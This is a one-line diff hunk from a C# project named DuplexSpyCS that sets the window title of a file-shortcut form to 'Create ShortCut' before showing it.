@@ -3156,6 +3156,7 @@ namespace DuplexSpyCS
                 MessageBox.Show("More then one file, this tool will choose the first file automatically.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
 
             frmFileShortCut f = new frmFileShortCut(v, File_GetCurrentPath(), lPath[0]);
+            f.Text = "Create ShortCut";
             f.Show();
         }
     }
